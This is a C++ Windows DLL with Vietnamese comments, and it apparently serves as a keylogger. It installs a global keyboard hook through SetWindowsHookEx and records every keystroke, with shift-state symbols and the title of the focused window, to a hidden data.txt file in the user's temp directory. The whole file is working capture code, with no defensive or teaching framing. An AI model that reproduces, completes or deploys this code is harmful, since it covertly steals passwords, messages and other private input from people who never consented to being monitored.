#include "stdafx.h"
#include <windows.h>
#include <fstream>
#include <iostream>

//vùng nhớ dùng chung, chứa biến handle của Hook
#pragma data_seg("SHARED_DATA")
HHOOK   hGlobalHook = NULL;
#pragma data_seg()

using namespace std;

KBDLLHOOKSTRUCT* p;

char *LogFile()
{
	char s[255];
	static char pth[255];
	GetTempPath(255, pth);
	lstrcpy(s, "data.txt");
	lstrcat(pth, s);
	return pth;
}

BOOL shiftPress = FALSE;
char lastFocusWindows[255];
HWND HFocusWindows = NULL;
fstream File;
//hàm lọc sự kiện nhấn phím

inline void InsertFocusWindowText() {
	char wnd_title[256];
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	if (!lstrcmp(lastFocusWindows, wnd_title)) {
		return;
	}
	else {
		File.open(LogFile(), ios::out | ios::app);
		char chuoi[500];
		lstrcpy(chuoi, "\n---");
		lstrcat(chuoi, wnd_title);
		lstrcat(chuoi, "---\n");
		lstrcpy(lastFocusWindows, wnd_title);
		File << chuoi;
		File.close();
	}
}

__declspec(dllexport) LRESULT __stdcall CALLBACK FillKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((HC_ACTION == nCode) && !(lParam & 0x80000000) && wParam == VK_SHIFT) {
		shiftPress = FALSE;
		goto rt;
	}

	if ((HC_ACTION == nCode) && (lParam & 0x80000000))  //neu ban an phim
	{
		if (wParam == VK_SHIFT) {
			shiftPress = TRUE;
			goto rt;
		}
	InsertFocusWindowText();
	char ch, chuoi[20];
		File.open(LogFile(), ios::out | ios::app);
		switch (wParam) {
		case VK_OEM_1:
			if (!shiftPress)
				lstrcpy(chuoi, ";");
			else
				lstrcpy(chuoi, ":");
			File << chuoi;
			break;
		case VK_OEM_2:
			if (!shiftPress)
				lstrcpy(chuoi, "/");
			else
				lstrcpy(chuoi, "?");
			File << chuoi;
			break;
		case VK_OEM_3:
			if (!shiftPress)
				lstrcpy(chuoi, "`");
			else
				lstrcpy(chuoi, "~");
			File << chuoi;
			break;
		case VK_OEM_4:
			if (!shiftPress)
				lstrcpy(chuoi, "[");
			else
				lstrcpy(chuoi, "{");
			File << chuoi;
			break;
		case VK_OEM_5:
			if (!shiftPress)
				lstrcpy(chuoi, "\\");
			else
				lstrcpy(chuoi, "|");
			File << chuoi;
			break;
		case VK_OEM_6:
			if (!shiftPress)
				lstrcpy(chuoi, "]");
			else
				lstrcpy(chuoi, "}");
			File << chuoi;
			break;
		case VK_OEM_7:
			if (!shiftPress)
				lstrcpy(chuoi, "'");
			else
				lstrcpy(chuoi, "\"");
			File << chuoi;
			break;
		case VK_OEM_COMMA:
			if (!shiftPress)
				lstrcpy(chuoi, ",");
			else
				lstrcpy(chuoi, "<");
			File << chuoi;
			break;
		case VK_OEM_MINUS:
			if (!shiftPress)
				lstrcpy(chuoi, "-");
			else
				lstrcpy(chuoi, "_");
			File << chuoi;
			break;
		case VK_OEM_PERIOD:
			if (!shiftPress)
				lstrcpy(chuoi, ".");
			else
				lstrcpy(chuoi, ">");
			File << chuoi;
			break;
		case VK_OEM_PLUS:
			if (!shiftPress)
				lstrcpy(chuoi, "=");
			else
				lstrcpy(chuoi, "+");
			File << chuoi;
			break;
		case VK_RETURN:
			ch = '\n';//gan ky tu xuong dong
			File.write(&ch, sizeof(ch)); //ghi ra
			break;
		case VK_TAB:
			lstrcpy(chuoi, "\t[tb]");
			File << chuoi;
			break;
		case VK_CLEAR:
			lstrcpy(chuoi, "[clear]");
			File << chuoi;
			break;
		case VK_BACK:
			lstrcpy(chuoi, "<*");  //phim backspace
			File << chuoi;
			break;
		case VK_SPACE:
			lstrcpy(chuoi, " ");  //
			File << chuoi;
			break;

		case VK_CONTROL:
			lstrcpy(chuoi, "[ctrl]");  //
			File << chuoi;
			break;
		case VK_LEFT:
			lstrcpy(chuoi, "[<-]");  //
			File << chuoi;
			break;
		case VK_HOME:
			lstrcpy(chuoi, "[Home]");  //
			File << chuoi;
			break;
		case VK_END:
			lstrcpy(chuoi, "[end]");  //
			File << chuoi;
			break;
		case VK_PRIOR:
			lstrcpy(chuoi, "[PgUp]");  //
			File << chuoi;
			break;
		case VK_NEXT:
			lstrcpy(chuoi, "[PgDn]");  //
			File << chuoi;
			break;
		case VK_UP:
			lstrcpy(chuoi, "[Up]");  //
			File << chuoi;
			break;
		case VK_RIGHT:
			lstrcpy(chuoi, "[->]");  //
			File << chuoi;
			break;
		case VK_DOWN:
			lstrcpy(chuoi, "[Down]");  //
			File << chuoi;
			break;
		case VK_DELETE:
			lstrcpy(chuoi, "[del]");  //
			File << chuoi;
			break;
		case VK_LBUTTON:
			lstrcpy(chuoi, "[CT]");  //
			File << chuoi;
			break;
		case VK_RBUTTON:
			lstrcpy(chuoi, "[CP]");  //
			File << chuoi;
			break;
		case VK_MENU:
			lstrcpy(chuoi, "[alt]");  //
			File << chuoi;
			break;
		case VK_CANCEL:
			lstrcpy(chuoi, "[break]");  //
			File << chuoi;
			break;
		}
		if ((wParam >= 0x30 && wParam <= 0x39) || (wParam >= 41 && wParam <= 0x5A))  //neu la cac nut tu 0 --> 9 hoac tu a -> Z
		{
			BYTE ks[256];
			GetKeyboardState(ks);  //xac dinh trang thai nut bam
			WORD w;
			UINT scan;
			scan = 0;
			ToAscii(wParam, scan, ks, &w, 0);  //chuyen ma nut bam ra ma Ascii
			ch = char(w);
			if (shiftPress) {
				if (ch <= '9') { //neu 0 --> 9
					switch (ch) {
					case '1':
						ch = '!';
						break;
					case '2':
						ch = '@';
						break;
					case '3':
						ch = '#';
						break;
					case '4':
						ch = '$';
						break;
					case '5':
						ch = '%';
						break;
					case '6':
						ch = '^';
						break;
					case '7':
						ch = '&';
						break;
					case '8':
						ch = '*';
						break;
					case '9':
						ch = '(';
						break;
					case '0':
						ch = ')';
						break;
					}
				}
			}
			File.write(&ch, sizeof(ch));//ghi ra File cac chu cai tim duoc
		}

		File.close();//dong File,tiep tuc chu trinh( moi khi bam 1 phim lai mo File )
	}
	//gọi Filter Function kế tiếp trong chuỗi các Filter Function
	rt:
	return CallNextHookEx(hGlobalHook, nCode, wParam, lParam);
}
//hàm lấy hmod
HMODULE WINAPI ModuleFromAddress(PVOID pv)
{
	MEMORY_BASIC_INFORMATION mbi;
	if (::VirtualQuery(pv, &mbi, sizeof(mbi)) != 0)
	{
		return (HMODULE)mbi.AllocationBase;
	}
	else
	{
		return NULL;
	}
}

//cài đặt hook
__declspec(dllexport) BOOL InstallHook() {
	BOOL bOk;
	//ấn định biến hGlobalHook tại vùng nhớ dùng chung
	hGlobalHook = ::SetWindowsHookEx(WH_KEYBOARD, FillKeyboard,
		ModuleFromAddress(FillKeyboard), 0);
	bOk = (hGlobalHook != NULL);
	return bOk;
}